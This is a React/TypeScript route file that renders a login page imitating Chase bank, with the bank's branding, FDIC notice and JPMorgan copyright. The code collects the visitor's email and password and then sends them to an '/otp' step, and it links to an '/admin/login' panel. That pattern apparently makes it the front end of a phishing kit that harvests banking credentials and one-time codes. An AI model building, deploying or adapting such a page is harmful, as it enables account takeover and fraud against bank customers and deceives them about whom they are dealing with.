import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { signIn } from "@/lib/auth";
import homepageLogo from "@/assets/homepage-logo.png.asset.json";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [
      { title: "Sign in — Chase" },
      { name: "description", content: "Sign in to your Chase account." },
    ],
  }),
});

const CHASE_BLUE = "#117ACA";

function Index() {
  const navigate = useNavigate();
  const [showPw, setShowPw] = useState(false);
  const [remember, setRemember] = useState(true);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const onSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    try {
      await signIn(email.trim(), password);
      navigate({ to: "/otp" });
    } catch (err) {
      setError(err instanceof Error ? err.message : "Sign in failed");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen flex flex-col bg-white">
      <div className="flex-1 min-h-[60vh] sm:min-h-[65vh]" style={{ backgroundColor: CHASE_BLUE }} />

      <div className="mx-auto w-full max-w-md px-4 sm:px-6 relative">
        <form
          onSubmit={onSubmit}
          className="bg-white shadow-md px-5 sm:px-7 pt-6 pb-6 -mt-[28vh] sm:-mt-[32vh] relative z-10"
        >
          <div className="flex justify-center mb-6">
            <img
              src={homepageLogo.url}
              alt="Logo"
              className="h-16 w-auto"
            />
          </div>

          <label className="block">
            <span className="text-[15px] text-neutral-700">Enter your email</span>
            <div className="flex items-end gap-2 border-b border-neutral-400 pb-1.5 mt-2">
              <input
                type="email"
                autoComplete="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="flex-1 bg-transparent outline-none text-[17px] text-neutral-900"
                required
              />
            </div>
          </label>

          <label className="block mt-7">
            <span className="text-[15px] text-neutral-700">Enter your password</span>
            <div className="flex items-end gap-2 border-b border-neutral-400 pb-1.5 mt-2">
              <input
                type={showPw ? "text" : "password"}
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="flex-1 bg-transparent outline-none text-[17px] text-neutral-900"
                required
              />
              <button
                type="button"
                onClick={() => setShowPw((s) => !s)}
                className="text-[15px] font-semibold underline"
                style={{ color: CHASE_BLUE }}
              >
                {showPw ? "Hide" : "Show"}
              </button>
            </div>
          </label>

          <div className="mt-6">
            <CheckRow
              label="Remember me"
              checked={remember}
              onChange={() => setRemember(!remember)}
            />
          </div>

          {error && (
            <p className="mt-4 text-[14px] text-red-600" role="alert">
              {error}
            </p>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full mt-6 py-3.5 text-white text-[17px] font-medium disabled:opacity-60"
            style={{ backgroundColor: CHASE_BLUE }}
          >
            {loading ? "Signing in…" : "Sign in"}
          </button>

          <button
            type="button"
            className="w-full mt-4 text-[16px] font-semibold"
            style={{ color: CHASE_BLUE }}
          >
            Forgot username or password?
          </button>
        </form>

        <div className="pt-5 pb-3 flex items-center justify-center gap-3 sm:gap-4 text-[14px] sm:text-[15px] flex-wrap">
          <Link to="/signup" className="underline font-medium" style={{ color: CHASE_BLUE }}>
            Sign up
          </Link>
          <Divider />
          <Link to="/signup" className="underline font-medium" style={{ color: CHASE_BLUE }}>
            Open an account
          </Link>
          <Divider />
          <Link to="/admin/login" className="underline font-medium" style={{ color: CHASE_BLUE }}>
            Admin
          </Link>
        </div>

        <div className="pb-10 pt-5 text-center text-[13px] sm:text-[14px] text-neutral-600 leading-relaxed">
          <p className="flex items-center justify-center gap-1.5">
            <HouseIcon />
            Equal Housing Opportunity
          </p>
          <p className="mt-3">Deposit products provided by JPMorgan Chase Bank, N.A. Member FDIC</p>
          <p className="mt-3">© 2024 JPMorgan Chase &amp; Co.</p>
        </div>
      </div>
    </main>
  );
}

function CheckRow({ label, checked, onChange }: { label: string; checked: boolean; onChange: () => void }) {
  return (
    <button type="button" onClick={onChange} className="flex items-center gap-3">
      <span
        className="w-6 h-6 flex items-center justify-center border-2"
        style={{ borderColor: CHASE_BLUE, backgroundColor: checked ? CHASE_BLUE : "transparent" }}
      >
        {checked && (
          <svg viewBox="0 0 24 24" className="w-4 h-4 text-white" fill="none" stroke="currentColor" strokeWidth="3">
            <polyline points="20 6 9 17 4 12" />
          </svg>
        )}
      </span>
      <span className="text-[17px] text-neutral-900">{label}</span>
    </button>
  );
}

function Divider() {
  return <span className="h-4 w-px bg-neutral-300" />;
}

function HouseIcon() {
  return (
    <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="1.5">
      <path d="M3 11l9-7 9 7v9a1 1 0 0 1-1 1h-5v-6h-6v6H4a1 1 0 0 1-1-1z" />
      <line x1="8" y1="14" x2="16" y2="14" />
    </svg>
  );
}
